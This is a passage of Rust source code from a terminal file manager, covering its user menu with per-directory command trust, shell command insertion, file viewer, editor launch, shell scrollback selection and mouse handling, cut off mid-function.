    fn build_menu_rows(&self) -> Vec<MenuRow> {
        use dmac_config::menu::Source;
        let mut rows = Vec::new();
        let dir_keys: Vec<char> = match self.menu_directory.as_ref() {
            Some(m) if m.source.runnable() => m.entries.iter().map(|e| e.key).collect(),
            _ => Vec::new(),
        };

        if let Some(global) = self.menu_global.as_ref() {
            for (i, e) in global.entries.iter().enumerate() {
                let shadowed = dir_keys.iter().any(|k| k.eq_ignore_ascii_case(&e.key));
                rows.push(MenuRow {
                    label: match shadowed {
                        true => format!("{}  (this directory uses {})", e.title, e.key),
                        false => e.title.clone(),
                    },
                    hint: e.key.to_string(),
                    separator: false,
                    inert: shadowed,
                    from: (!shadowed).then_some((MenuFrom::Global, i)),
                });
            }
        }

        let Some(dir) = self.menu_directory.as_ref() else {
            return rows;
        };
        if !rows.is_empty() {
            rows.push(MenuRow {
                label: String::new(),
                hint: String::new(),
                separator: true,
                inert: true,
                from: None,
            });
        }
        let runnable = dir.source.runnable();
        for (i, e) in dir.entries.iter().enumerate() {
            rows.push(MenuRow {
                label: e.title.clone(),
                // No accelerator printed beside something that will not answer:
                // a hint on a blocked row is a lie about what the key does.
                hint: match runnable {
                    true => e.key.to_string(),
                    false => String::new(),
                },
                separator: false,
                inert: !runnable,
                from: runnable.then_some((MenuFrom::Directory, i)),
            });
        }
        if !runnable && let Source::Directory { .. } = &dir.source {
            rows.push(MenuRow {
                label: String::new(),
                hint: String::new(),
                separator: true,
                inert: true,
                from: None,
            });
            rows.push(MenuRow {
                label: format!(
                    "this directory carries {} command(s) \u{2014} T to trust it",
                    dir.entries.len()
                ),
                hint: "T".into(),
                separator: false,
                inert: true,
                from: None,
            });
        }
        rows
    }

    /// Driving F2.
    fn user_menu_key(&mut self, k: KeyEvent, selected: usize) {
        let n = self.menu_rows.len();
        let step = |from: usize, by: isize| -> usize {
            // Over separators and over anything that cannot be chosen: a cursor
            // resting on a row that does nothing is a cursor you press Enter on
            // for no reason.
            let mut at = from as isize;
            for _ in 0..n.max(1) {
                at = (at + by).rem_euclid(n.max(1) as isize);
                if self
                    .menu_rows
                    .get(at as usize)
                    .is_some_and(|r| r.from.is_some())
                {
                    break;
                }
            }
            at as usize
        };
        match k.code {
            KeyCode::Esc | KeyCode::F(2) | KeyCode::F(10) => self.mode = Mode::Normal,
            KeyCode::Up => {
                self.mode = Mode::UserMenu {
                    selected: step(selected, -1),
                }
            }
            KeyCode::Down => {
                self.mode = Mode::UserMenu {
                    selected: step(selected, 1),
                }
            }
            KeyCode::Enter => self.choose_menu_row(selected),
            KeyCode::Char('T') => self.trust_directory_menu(),
            KeyCode::Char(c) => {
                if let Some(row) = self
                    .menu_rows
                    .iter()
                    .position(|r| r.from.is_some() && r.hint.starts_with(c.to_ascii_lowercase()))
                {
                    self.choose_menu_row(row);
                }
            }
            _ => {}
        }
    }

    /// Approve the directory menu that is on screen.
    ///
    /// Against its *content*, so the next `git pull` asks again. Approving a
    /// path once and then running whatever arrives in it later is the failure
    /// the whole trust mechanism exists to prevent.
    fn trust_directory_menu(&mut self) {
        use dmac_config::menu::Source;
        let Some(Source::Directory { path, .. }) =
            self.menu_directory.as_ref().map(|m| m.source.clone())
        else {
            return;
        };
        let Ok(text) = std::fs::read_to_string(&path) else {
            self.status = format!("{} could not be read", path.display());
            return;
        };
        match self.trust.trust(&path, &text) {
            Ok(()) => {
                self.status = format!("trusted {}", path.display());
                // Re-read, so what is on screen is the approved thing rather
                // than the blocked drawing of it.
                self.open_user_menu();
            }
            Err(e) => self.status = format!("could not record that: {e}"),
        }
    }

    /// Run whatever is on this row.
    fn choose_menu_row(&mut self, row: usize) {
        let Some(from) = self.menu_rows.get(row).and_then(|r| r.from) else {
            return;
        };
        let entry = match from {
            (MenuFrom::Global, i) => self.menu_global.as_ref().and_then(|m| m.entries.get(i)),
            (MenuFrom::Directory, i) => self.menu_directory.as_ref().and_then(|m| m.entries.get(i)),
        };
        let Some(entry) = entry.cloned() else {
            return;
        };
        self.mode = Mode::Normal;
        self.run_menu_entry(&entry);
    }

    /// What the placeholders mean, right now.
    ///
    /// Built from the panels at the moment the command is chosen rather than
    /// when the menu opened: the two are usually the same instant, and when
    /// they are not, what the user is looking at is what they meant.
    fn menu_values(&self, name: &str) -> Option<Vec<String>> {
        let session = self.ses();
        let i = Self::idx(session.active);
        let here = &session.cwd[i];
        let there = &session.cwd[1 - i];
        let current = session.panels[i].current();
        let operands: Vec<String> = session.panels[i]
            .operands()
            .iter()
            .map(|e| e.name.clone())
            .collect();
        let full = |n: &str| here.as_path().join(n).display().to_string();

        match name {
            "name" => current.map(|e| vec![e.name.clone()]),
            "path" => current.map(|e| vec![full(&e.name)]),
            "stem" => current.map(|e| {
                let n = &e.name;
                vec![n.rsplit_once('.').map_or(n.clone(), |(s, _)| s.to_string())]
            }),
            "ext" => current.map(|e| {
                vec![
                    e.name
                        .rsplit_once('.')
                        .map_or(String::new(), |(_, x)| x.to_string()),
                ]
            }),
            "names" => Some(operands),
            "paths" => Some(operands.iter().map(|n| full(n)).collect()),
            "dir" => Some(vec![here.as_path().display().to_string()]),
            "other" => Some(vec![there.as_path().display().to_string()]),
            _ => None,
        }
    }

    /// Expand a command and put it in the shell.
    ///
    /// Written into the hosted shell rather than spawned out of sight: you see
    /// what ran, the output goes where output goes, and it inherits the shell's
    /// own environment and directory. `confirm` decides whether Enter is
    /// pressed for you — and on an entry that deletes something, seeing the
    /// substituted line first is exactly when a surprising filename shows
    /// itself.
    fn run_menu_entry(&mut self, entry: &dmac_config::menu::Entry) {
        let line = match dmac_config::menu::expand(&entry.run, &|n| self.menu_values(n)) {
            Ok(line) => line,
            Err(e) => {
                self.status = format!("{}: {e}", entry.title);
                return;
            }
        };
        let waker = self.waker();
        let (cols, rows) = self.shell_size();
        let confirm = entry.confirm;
        let title = entry.title.clone();
        let session = self.sessions.current_mut();
        let shell = match session.shell(cols, rows, waker) {
            Ok(shell) => shell,
            Err(e) => {
                self.status = format!("no shell to run it in: {e}");
                return;
            }
        };
        // Into a prompt or not at all. A line typed at something already
        // running is not a command, it is a sentence handed to whatever has the
        // keyboard.
        if !shell.at_prompt() {
            self.status = format!("the shell here is busy \u{2014} {title} not run");
            return;
        }
        let wrote = match confirm {
            true => shell.write(line.as_bytes()),
            false => shell.run(&line),
        };
        match wrote {
            Ok(()) => {
                session.view = View::Shell;
                self.status = match confirm {
                    true => format!("{title} \u{2014} read it, then press Enter"),
                    false => title,
                };
            }
            Err(e) => self.status = format!("could not run {title}: {e}"),
        }
    }

    /// F3: show the file under the cursor.
    ///
    /// The whole file is read here rather than on a task, which is a deliberate
    /// exception to "nothing blocks the render loop": the read is capped at
    /// [`dmac_view::READ_CAP`], so the worst case is eight megabytes off a
    /// local disk, and a viewer that opens a frame later than the keypress
    /// feels broken in a way the budget does not describe. A remote file is a
    /// different matter and is refused rather than blocked on — that is what
    /// the VFS backends are for, and they are not here yet.
    fn open_viewer(&mut self) {
        let Some(entry) = self.ses().active_panel().current().cloned() else {
            self.status = "nothing to view".into();
            return;
        };
        if matches!(
            entry.kind,
            dmac_core::EntryKind::Dir | dmac_core::EntryKind::Parent
        ) {
            self.status = format!("{} is a directory \u{2014} Enter opens it", entry.name);
            return;
        }
        let cwd = self.ses().cwd[Self::idx(self.ses().active)].clone();
        if !cwd.is_local() {
            self.status = "the viewer only reads local files so far".into();
            return;
        }
        let path = cwd.as_path().join(&entry.name);
        match dmac_view::Document::open(&path) {
            Ok(doc) => {
                // A binary file opens in hex whatever the last file did: there
                // is nothing else it could honestly show.
                let hex = doc.kind() == dmac_view::Kind::Binary;
                self.status = match doc.truncated() {
                    true => format!(
                        "{}: showing the first {} of {} bytes",
                        entry.name,
                        dmac_view::READ_CAP,
                        doc.total_bytes()
                    ),
                    false => String::new(),
                };
                self.document = Some(doc);
                self.view_match = 0;
                self.mode = Mode::View { scroll: 0, hex };
            }
            Err(e) => self.status = format!("cannot view: {e}"),
        }
    }

    /// F4: open the file under the cursor in the editor.
    ///
    /// The configured one, out of process. There is no editor in this program
    /// and writing one is a subsystem rather than a keybinding — and the
    /// editor the user already has is better than the one this would grow into.
    /// `DMAC_EDITOR` names it; VS Code is the default.
    fn edit_here(&mut self) {
        let name = self.ses().active_panel().current().map(|e| e.name.clone());
        let Some(name) = name else {
            self.status = "nothing to edit".into();
            return;
        };
        let cwd = self.ses().cwd[Self::idx(self.ses().active)].clone();
        if !cwd.is_local() {
            self.status = "the editor only opens local files".into();
            return;
        }
        let path = cwd.as_path().join(&name);
        let tx = self.tx.clone();
        if let Ok(runtime) = tokio::runtime::Handle::try_current() {
            runtime.spawn_blocking(move || {
                let message = match dmac_desktop::open_editor(&path) {
                    Ok(()) => Ok(format!("opened {}", path.display())),
                    Err(e) => Err(format!("could not open an editor: {e}")),
                };
                let _ = tx.send(Update::Editor(message));
            });
        }
    }

    /// Driving the viewer.
    ///
    /// The keys are a pager's, because that is what everyone's fingers already
    /// know: arrows and page keys move, `/` searches, `n` and `N` walk the
    /// matches, `Esc` leaves. `h` toggles hex — except on a binary file, where
    /// there is nothing to toggle to.
    fn view_key(&mut self, k: KeyEvent, scroll: usize, hex: bool) {
        let rows = self.document.as_ref().map_or(0, |d| d.rows(hex));
        let page = (self.layout.view.height as usize).max(1);
        let last = rows.saturating_sub(page);
        let at = |s: usize| Mode::View {
            scroll: s.min(last),
            hex,
        };
        match k.code {
            KeyCode::Esc | KeyCode::F(3) | KeyCode::F(10) | KeyCode::Char('q') => {
                // The document goes with it. Holding a file open because a mode
                // might come back is holding a file open for ever.
                self.document = None;
                self.mode = Mode::Normal;
            }
            KeyCode::Up | KeyCode::Char('k') => self.mode = at(scroll.saturating_sub(1)),
            KeyCode::Down | KeyCode::Char('j') => self.mode = at(scroll + 1),
            KeyCode::PageUp => self.mode = at(scroll.saturating_sub(page)),
            KeyCode::PageDown | KeyCode::Char(' ') => self.mode = at(scroll + page),
            KeyCode::Home => self.mode = at(0),
            KeyCode::End => self.mode = at(last),
            KeyCode::Char('h') => {
                let binary = self
                    .document
                    .as_ref()
                    .is_some_and(|d| d.kind() == dmac_view::Kind::Binary);
                match binary {
                    // Nothing to go back to: the text view of a binary file is
                    // a screenful of replacement characters.
                    true => self.status = "that file is binary \u{2014} there is only hex".into(),
                    // Back to the top: the two views count rows differently, so
                    // keeping the number would land somewhere unrelated.
                    false => {
                        self.mode = Mode::View {
                            scroll: 0,
                            hex: !hex,
                        }
                    }
                }
            }
            KeyCode::Char('/') => {
                self.open_prompt(PromptIntent::ViewSearch, self.view_search.clone());
            }
            KeyCode::Char('n') => self.step_match(1, hex),
            KeyCode::Char('N') => self.step_match(-1, hex),
            _ => {}
        }
    }

    /// Move to the next or previous row matching the current search.
    ///
    /// Wraps, and says so: a search that stops silently at the last match is a
    /// search you press again wondering whether it is broken.
    fn step_match(&mut self, by: isize, hex: bool) {
        let Some(doc) = self.document.as_ref() else {
            return;
        };
        if self.view_search.is_empty() {
            self.status = "nothing to search for \u{2014} / to look for something".into();
            return;
        }
        let hits = doc.search(&self.view_search, hex);
        if hits.is_empty() {
            self.status = format!("{}: no match", self.view_search);
            return;
        }
        let n = hits.len() as isize;
        self.view_match = (self.view_match as isize + by).rem_euclid(n) as usize;
        let row = hits.get(self.view_match).copied().unwrap_or(0);
        self.mode = Mode::View { scroll: row, hex };
        self.status = format!(
            "{}: {} of {}",
            self.view_search,
            self.view_match + 1,
            hits.len()
        );
    }

    /// The help page has the keyboard: scroll it, or close it.
    fn help_key(&mut self, k: KeyEvent, scroll: usize) {
        // Impatience is a legitimate answer to an animation, and a key that
        // only cancels one is a key that did not do what it says. So the page
        // lands at once *and* the key still acts: pressing Down during the
        // arrival scrolls down a line, on a page that is now there to scroll.
        self.help_entrance = None;
        let area = self.layout.help;
        let visible = (area.height as usize).max(1);
        let max = crate::ui::help::page_len(area.width as usize).saturating_sub(visible);
        let at = |s: usize| Mode::Help { scroll: s.min(max) };
        match k.code {
            KeyCode::Esc | KeyCode::F(1) | KeyCode::F(10) | KeyCode::Char('q') => {
                self.help_entrance = None;
                self.mode = Mode::Normal;
            }
            KeyCode::Up | KeyCode::Char('k') => self.mode = at(scroll.saturating_sub(1)),
            KeyCode::Down | KeyCode::Char('j') => self.mode = at(scroll + 1),
            KeyCode::PageUp => self.mode = at(scroll.saturating_sub(visible)),
            KeyCode::PageDown | KeyCode::Char(' ') => self.mode = at(scroll + visible),
            KeyCode::Home => self.mode = at(0),
            KeyCode::End => self.mode = at(max),
            _ => {}
        }
    }

    /// A screensaver now, or the next one in the catalogue if one is showing.
    fn screensaver_next(&mut self) {
        // The key that skips the picker also closes it.
        if matches!(self.mode, Mode::Picker { .. }) {
            self.mode = Mode::Normal;
        }
        self.screensaver.next(0, 0);
        self.status = match self.screensaver.current() {
            Some(running) => format!("screensaver: {running}"),
            None => "screensaver failed to start".into(),
        };
    }

    fn send_to_shell(&mut self, k: KeyEvent) {
        let Some(bytes) = crate::ui::shell::encode(k) else {
            return;
        };
        // Typing means you have finished reading. Every terminal snaps back to
        // the live screen on the first keystroke, and one that did not would
        // hide the echo of what was just typed somewhere below the view.
        self.shell_to_live();
        let (cols, rows) = self.shell_size();
        let waker = self.waker();
        match self.ses_mut().shell(cols, rows, waker) {
            Ok(shell) => {
                if let Err(e) = shell.write(&bytes) {
                    // The shell exited under us. Say so and go back to the
                    // panels rather than swallowing keys into a dead process.
                    self.status = format!("shell: {e}");
                    self.ses_mut().view = View::Panels;
                }
            }
            Err(e) => {
                self.status = format!("shell: {e}");
                self.ses_mut().view = View::Panels;
            }
        }
    }

    /// How many rows a page-sized movement over the hosted pane covers.
    ///
    /// One short of the pane, the way every pager does it: the line you were
    /// reading when you pressed the key stays on screen, and without it you
    /// have to guess whether anything went past unread.
    fn shell_page(&self) -> i32 {
        i32::from(self.layout.shell.height.max(2)) - 1
    }

    /// How far the hosted view has been pushed back from the live screen.
    fn shell_back(&self) -> i32 {
        self.ses().hosted().map_or(0, |sh| {
            i32::try_from(sh.scroll_offset()).unwrap_or(i32::MAX)
        })
    }

    /// Move the hosted view by `delta` lines — positive goes back into history
    /// — keeping any selection and caret on the text they were put on.
    ///
    /// Moved by what the buffer actually gave and not by what was asked for: at
    /// either end of the scrollback the request is clamped, and shifting a
    /// highlight by the request would slide it off its own characters while
    /// still looking exactly right.
    fn scroll_shell(&mut self, delta: i32) -> i32 {
        let moved = self.ses().hosted().map_or(0, |sh| sh.scroll_by(delta));
        if moved != 0 {
            if let Some(sel) = self.shell_selection.as_mut() {
                sel.shift(moved);
            }
            if let Some(caret) = self.shell_caret.as_mut() {
                caret.0 += moved;
            }
        }
        moved
    }

    /// Back to the live screen, with nothing selected.
    fn shell_to_live(&mut self) {
        if let Some(sh) = self.ses().hosted() {
            sh.scroll_to_bottom();
        }
        self.shell_selection = None;
        self.shell_caret = None;
    }

    /// Where the child's own cursor is, in the pane's visible coordinates.
    fn shell_cursor_cell(&self) -> crate::ui::shell::Cell {
        let back = self.shell_back();
        self.ses()
            .hosted()
            .and_then(|sh| sh.with_screen(|s| s.cursor_position()))
            .map_or((back, 0), |(row, col)| (i32::from(row) + back, col))
    }

    /// Reading back through what the shell has already printed, and selecting
    /// it. Returns whether the key was ours; everything else belongs to the
    /// child.
    ///
    /// The split is the whole design: **Ctrl-Shift looks, Shift selects**.
    /// Shift-PageUp is deliberately both — it is the one scrollback key every
    /// terminal already has, so it scrolls while nothing is selected and
    /// extends the selection once something is.
    fn shell_scrollback_key(&mut self, k: KeyEvent) -> bool {
        let shift = k.modifiers.contains(KeyModifiers::SHIFT);
        let ctrl = k.modifiers.contains(KeyModifiers::CONTROL);
        let page = self.shell_page();

        // Esc puts the live screen back, but only when there is something to
        // come back from: inside a hosted `vim` it has to reach the child, and
        // a key that sometimes arrives and sometimes does not is unusable.
        if k.code == KeyCode::Esc
            && !ctrl
            && (self.shell_selection.is_some() || self.shell_back() > 0)
        {
            self.shell_to_live();
            return true;
        }
        if !shift {
            return false;
        }
        let selecting = self.shell_selection.is_some();

        match k.code {
            // --- Ctrl-Shift: move the view, and touch nothing else. ---
            KeyCode::Up if ctrl => self.looked(1),
            KeyCode::Down if ctrl => self.looked(-1),
            KeyCode::PageUp if ctrl => self.looked(page),
            KeyCode::PageDown if ctrl => self.looked(-page),
            // The oldest line still held, and the live screen.
            KeyCode::Home if ctrl => self.looked(i32::MAX),
            KeyCode::End if ctrl => self.looked(i32::MIN),

            // The scrollback keys every terminal has, while nothing is selected.
            KeyCode::PageUp if !selecting => self.looked(page),
            KeyCode::PageDown if !selecting => self.looked(-page),

            // --- Shift: grow the selection, scrolling when it runs off an edge. ---
            KeyCode::Up => self.extend_shell(Step::Rows(-1)),
            KeyCode::Down => self.extend_shell(Step::Rows(1)),
            KeyCode::PageUp => self.extend_shell(Step::Rows(-page)),
            KeyCode::PageDown => self.extend_shell(Step::Rows(page)),
            KeyCode::Left => self.extend_shell(Step::Left),
            KeyCode::Right => self.extend_shell(Step::Right),
            KeyCode::Home => self.extend_shell(Step::LineStart),
            KeyCode::End => self.extend_shell(Step::LineEnd),

            _ => false,
        }
    }

    /// Scroll without disturbing the selection, and say the key was ours.
    fn looked(&mut self, delta: i32) -> bool {
        self.scroll_shell(delta);
        true
    }

    /// Move the keyboard caret one step and drag the selection with it.
    ///
    /// Scrolls rather than stopping when the caret steps off an edge: selecting
    /// more than one screenful is the reason any of this exists, and a
    /// selection that quietly stopped growing while the key was still held down
    /// would look exactly like one that had worked.
    fn extend_shell(&mut self, step: Step) -> bool {
        let Some((cols, _)) = self.ses().hosted().map(|sh| sh.size()) else {
            return false;
        };
        let rows = i32::from(self.layout.shell.height.max(1));

        // The first Shift keypress anchors on the child's cursor: that is where
        // the eye already is, and it is the one position the user has not had
        // to put anything at. Clamped into the view, because after reading back
        // the cursor is a long way below it — and anchoring down there would
        // drag the view back to the live screen, throwing away exactly what the
        // user had scrolled to in order to select it.
        let mut caret = match self.shell_caret {
            Some(c) => c,
            None => {
                let at = self.shell_cursor_cell();
                let at = (at.0.clamp(0, rows - 1), at.1);
                self.shell_selection = Some(crate::ui::shell::Selection::new(at.0, at.1));
                at
            }
        };

        match step {
            Step::Rows(d) => caret.0 += d,
            // Wrapping at the margins, so holding Shift-Right walks the text
            // the way reading does instead of stopping at the right edge.
            Step::Left => {
                if caret.1 > 0 {
                    caret.1 -= 1;
                } else {
                    caret.1 = cols.saturating_sub(1);
                    caret.0 -= 1;
                }
            }
            Step::Right => {
                if caret.1.saturating_add(1) < cols {
                    caret.1 += 1;
                } else {
                    caret.1 = 0;
                    caret.0 += 1;
                }
            }
            Step::LineStart => caret.1 = 0,
            Step::LineEnd => caret.1 = cols.saturating_sub(1),
        }
        self.shell_caret = Some(caret);

        // Off an edge: move the view instead, which drags the caret and the
        // anchor back into their old relationship with the text.
        let off = if caret.0 < 0 {
            -caret.0
        } else if caret.0 >= rows {
            rows - 1 - caret.0
        } else {
            0
        };
        if off != 0 {
            self.scroll_shell(off);
        }

        // Whatever the buffer would not give, the caret gives up: past the
        // oldest line held there is nothing further to select.
        let settled = self.shell_caret.map(|c| (c.0.clamp(0, rows - 1), c.1));
        self.shell_caret = settled;
        if let (Some(sel), Some(c)) = (self.shell_selection.as_mut(), settled) {
            sel.extend_to(c.0, c.1);
        }
        true
    }

    fn context_key(&mut self, k: KeyEvent, selected: usize, anchor: (u16, u16)) {
        let items = self.context_items();
        match k.code {
            KeyCode::Esc => self.mode = Mode::Normal,
            KeyCode::Up => {
                if let Some(i) = crate::ui::menu::next_selectable(&items, selected, -1) {
                    self.mode = Mode::Context {
                        selected: i,
                        anchor,
                    };
                }
            }
            KeyCode::Down => {
                if let Some(i) = crate::ui::menu::next_selectable(&items, selected, 1) {
                    self.mode = Mode::Context {
                        selected: i,
                        anchor,
                    };
                }
            }
            KeyCode::Enter => self.run_context_item(selected),
            _ => {}
        }
    }

    fn start_picked(&mut self, selected: usize) {
        let catalog = dmac_fx::catalog();
        let name = crate::ui::picker::name_at(catalog, selected).to_string();
        self.mode = Mode::Normal;

        match name.as_str() {
            // These are modes, not effects: set them and start one immediately.
            "random" | "rotation" => {
                self.screensaver.set_effect(&name);
                self.screensaver.start_now(0, 0);
            }
            _ => match dmac_fx::build(&name) {
                Some(effect) => self.screensaver.start_with(effect, 0, 0),
                None => {
                    self.status = format!("unknown effect: {name}");
                    return;
                }
            },
        }
        self.status = match self.screensaver.current() {
            Some(running) => format!("screensaver: {running}"),
            None => "screensaver failed to start".into(),
        };
    }

    // ---- mouse ----

    /// Which panel a screen position falls in, and which row within it.
    ///
    /// The row is `None` for empty space below the last entry — but the panel is
    /// still reported, because clicking an empty panel must focus it. Returning
    /// `None` for the whole hit would leave the click acting on the *other*
    /// panel, which in a two-panel file manager is the worst available outcome.
    fn hit_test(&self, col: u16, row: u16) -> Option<(PanelId, Option<usize>)> {
        for (i, id) in [PanelId::Left, PanelId::Right].into_iter().enumerate() {
            let area = self.layout.panels[i];
            if area.width == 0 || area.height == 0 {
                continue;
            }
            if col >= area.x
                && col < area.x + area.width
                && row >= area.y
                && row < area.y + area.height
            {
                let index = self.ses().panels[i].offset() + (row - area.y) as usize;
                return Some((id, (index < self.ses().panels[i].len()).then_some(index)));
            }
        }
        None
    }

    fn on_mouse(&mut self, m: MouseEvent) {
        // Never let mouse motion end a game; the idle clock still resets.
        self.screensaver.on_activity();
        self.mouse = Some((m.column, m.row));
        // A click dismisses the splash, but pointer motion alone does not —
        // brushing the mouse should not rob you of the version you were reading.
        if !matches!(m.kind, MouseEventKind::Moved) {
            // Any deliberate mouse action ends a keyboard Shift-selection, so the
            // two gestures never fight over the same span. Mere pointer motion
            // does not: the mouse can drift while you are selecting with the
            // keyboard, and that should cost you nothing.
            self.ses_mut().active_panel_mut().end_selection_gesture();
            if self.dismiss_splash() {
                return;
            }
        }
        if self.screensaver.is_active() || self.mode != Mode::Normal {
            self.mouse_overlay(m);
            return;
        }

        // The shell owns the pointer while it is showing: there are no rows to
        // click there, only text to select.
        if self.ses().view == View::Shell && self.shell_mouse(m) {
            return;
        }

        match m.kind {
            MouseEventKind::Down(MouseButton::Left) => {
                // The rail is to the left of the panels, so it is checked first.
                let outer = self.layout.rail_outer;
                if outer.width > 0 && m.column >= outer.x && m.column < outer.x + outer.width {
                    // The last column is the grip. Nothing happens until the
                    // pointer moves, so letting go without moving still picks
                    // the session under it and the column is not dead.
                    if m.column + 1 == outer.x + outer.width {
                        self.rail_grip = Some(false);
                        return;
                    }
                    self.pick_rail_session(m.row);
                    return;
                }
                match self.hit_test(m.column, m.row) {
                    Some((id, row)) => {
                        // Focus first, whether or not a row was hit.
                        self.ses_mut().active = id;
                        self.ses_mut().focus = Focus::Panel;
                        self.clear_quick_search();
                        let Some(index) = row else { return };

                        self.active_panel_mut().move_to(index);
                        self.drag = Some(Drag {
                            panel: id,
                            anchor: index,
                            toggling: false,
                        });

                        // Double-click opens, as in every file manager since 1995.
                        let now = std::time::Instant::now();
                        let double = self.last_click.is_some_and(|(t, p, i)| {
                            p == id && i == index && now.duration_since(t) < DOUBLE_CLICK
                        });
                        if double {
                            self.last_click = None;
                            self.activate();
                        } else {
                            self.last_click = Some((now, id, index));
                        }
                    }
                    None => {
                        if m.row == self.layout.fkeys.y && self.layout.fkeys.height > 0 {
                            self.fkey_click(m.column);
                        } else if m.row == self.layout.command.y && self.layout.command.height > 0 {
                            // Clicking the command line is the mouse equivalent
                            // of Esc, and must put the cursor there.
                            self.ses_mut().focus = Focus::CommandLine;
                        }
                    }
                }
            }

            // Right button sweeps the selection, as in Total Commander.
            MouseEventKind::Down(MouseButton::Right) => {
                if let Some((id, Some(index))) = self.hit_test(m.column, m.row) {
                    self.ses_mut().active = id;
                    self.ses_mut().focus = Focus::Panel;
                    self.active_panel_mut().move_to(index);
                    self.active_panel_mut().toggle_selection();
                    // `toggle_selection` steps down; put the cursor back where
                    // the user actually clicked.
                    self.active_panel_mut().move_to(index);
                    self.drag = Some(Drag {
                        panel: id,
                        anchor: index,
                        toggling: true,
                    });
                }
            }

            MouseEventKind::Drag(button) => {
                // Dragging the grip is a resize, and nothing else: the pointer
                // is over the rail's edge, not over any row.
                if self.rail_grip.is_some() && button == MouseButton::Left {
                    self.rail_grip = Some(true);
                    let x = self.layout.rail_outer.x;
                    self.set_rail_width(m.column.saturating_sub(x).saturating_add(1));
                    return;
                }
                if button == MouseButton::Right {
                    self.right_dragged = true;
                }
                if let Some(drag) = self.drag
                    && let Some((id, Some(index))) = self.hit_test(m.column, m.row)
                    && id == drag.panel
                {
                    self.sweep(drag, index);
                }
            }

            MouseEventKind::Up(_) => {
                // A press on the grip that never moved was a click on a row.
                if let Some(false) = self.rail_grip.take() {
                    self.pick_rail_session(m.row);
                }
                self.drag = None;
            }

            // Any-motion tracking: the pointer is drawn by inverting the cell
            // under it, so we need to know where it is on every move.
            MouseEventKind::Moved => {}

            // Three rows per notch: one is sluggish, a full page is disorienting.
            MouseEventKind::ScrollUp => self.scroll_under_pointer(m, -3),
            MouseEventKind::ScrollDown => self.scroll_under_pointer(m, 3),

            _ => {}
        }
    }

    /// Selecting text over the hosted shell. Returns whether the event was ours.
    fn shell_mouse(&mut self, m: MouseEvent) -> bool {
        let Some((row, col)) = self.shell_cell_at(m.column, m.row) else {
            return false;
        };
        match m.kind {
            MouseEventKind::Down(MouseButton::Left) => {
                // A second click inside the current selection takes the word
                // under it, the way every terminal has since X11.
                let double = self
                    .last_shell_click
                    .is_some_and(|(t, r, c)| t.elapsed() < DOUBLE_CLICK && (r, c) == (row, col));
                let mut sel = crate::ui::shell::Selection::new(i32::from(row), col);
                if double && let Some(sh) = self.ses().hosted() {
                    sel.expand_to_word(sh);
                    self.shell_selection = Some(sel);
                    self.selecting = false;
                    self.copy_selection();
                    self.last_shell_click = None;
                    return true;
                }
                self.last_shell_click = Some((std::time::Instant::now(), row, col));
                self.shell_selection = Some(sel);
                // The pointer takes over from the keyboard: two carets, one of
                // them stale, is worse than none.
                self.shell_caret = None;
                self.selecting = true;
                true
            }
            MouseEventKind::Drag(MouseButton::Left) if self.selecting => {
                if let Some(sel) = self.shell_selection.as_mut() {
                    sel.extend_to(i32::from(row), col);
                }
                true
            }
            MouseEventKind::Up(MouseButton::Left) if self.selecting => {
                self.selecting = false;
                match self.shell_selection {
                    // A click that never moved is a click, not a selection.
                    // Copying it would silently replace the clipboard with
                    // nothing, which is a way to lose work.
                    Some(sel) if sel.is_empty() => self.shell_selection = None,
                    Some(_) => self.copy_selection(),
                    None => {}
                }
                true
            }

            // Three lines per notch, the same as a panel: one is sluggish and a
            // page is disorienting. This is the gesture people try first, so it
            // is the one that has to work without being told about.
            MouseEventKind::ScrollUp => {
                self.scroll_shell(3);
                true
            }
            MouseEventKind::ScrollDown => {
                self.scroll_shell(-3);
                true
            }

            _ => false,
        }
    }

    /// Select every row between the drag anchor and the current one.
    ///
    /// Recomputed from the anchor each time rather than accumulated, so a fast
    /// drag that skips rows still selects the whole range.
    fn sweep(&mut self, drag: Drag, current: usize) {
        let i = Self::idx(drag.panel);
        let (lo, hi) = if drag.anchor <= current {
            (drag.anchor, current)
        } else {
            (current, drag.anchor)
        };

        let panel = &mut self.ses_mut().panels[i];
        for index in lo..=hi.min(panel.len().saturating_sub(1)) {
            if let Some(e) = panel.entries.get_mut(index)
                && e.kind != dmac_core::EntryKind::Parent
            {
                e.selected = true;
            }
        }
        panel.move_to(current);
        let _ = drag.toggling;
    }

    fn scroll_under_pointer(&mut self, m: MouseEvent, delta: isize) {
        // Scroll the panel the pointer is over, not the active one — that is
        // what every other application does and fighting it is just annoying.
        for (i, id) in [PanelId::Left, PanelId::Right].into_iter().enumerate() {
            let a = self.layout.panels[i];
            if m.column >= a.x && m.column < a.x + a.width && m.row >= a.y && m.row < a.y + a.height
            {
                self.panel_at(id).move_cursor(delta);
                return;
            }
        }
        self.active_panel_mut().move_cursor(delta);
    }

    fn mouse_context(&mut self, m: MouseEvent) {
        let Mode::Context { selected, anchor } = self.mode else {
            return;
        };
        let area = self.layout.menu;
        let inside = area.width > 0
            && m.column >= area.x
            && m.column < area.x + area.width
            && m.row >= area.y
            && m.row < area.y + area.height;

        match m.kind {
            MouseEventKind::Moved if inside => {
                // Hover-to-highlight, as in every desktop context menu.
                let row = (m.row - area.y) as usize;
                let items = self.context_items();
                if items.get(row).is_some_and(|i| i.selectable()) {
                    self.mode = Mode::Context {
                        selected: row,
                        anchor,
                    };
                }
            }
            MouseEventKind::Down(MouseButton::Left) | MouseEventKind::Down(MouseButton::Right) => {
                if !inside {
                    self.mode = Mode::Normal;
                    return;
                }
                let row = (m.row - area.y) as usize;
                let items = self.context_items();
                if items.get(row).is_some_and(|i| i.selectable()) {
                    self.run_context_item(row);
                } else {
                    let _ = selected;
                }
            }
            _ => {}
        }
    }

    fn panel_at(&mut self, id: PanelId) -> &mut Panel {
        self.ses_mut().panel_mut(id)
    }

    /// The F-key bar is clickable: each label occupies an equal share of the width.
    fn fkey_click(&mut self, column: u16) {
        let width = self.layout.fkeys.width.max(1);
        let cell = (width / 10).max(1);
        let n = ((column.saturating_sub(self.layout.fkeys.x) / cell) + 1).min(10);
        let action = match n {
            1 => Action::Help,
            2 => Action::UserMenu,
            3 => Action::View,
            4 => Action::Edit,
            5 => Action::Copy,
            6 => Action::Move,
            7 => Action::MakeDir,
            8 => Action::Delete,
            9 => Action::UtilitiesMenu,
            _ => Action::Quit,
        };
        self.handle(action);
    }

    /// Mouse handling while an overlay or the screensaver owns the screen.
    fn mouse_overlay(&mut self, m: MouseEvent) {
        if let Mode::Context { .. } = self.mode {
            return self.mouse_context(m);
        }
        if let Mode::Help { scroll } = self.mode {
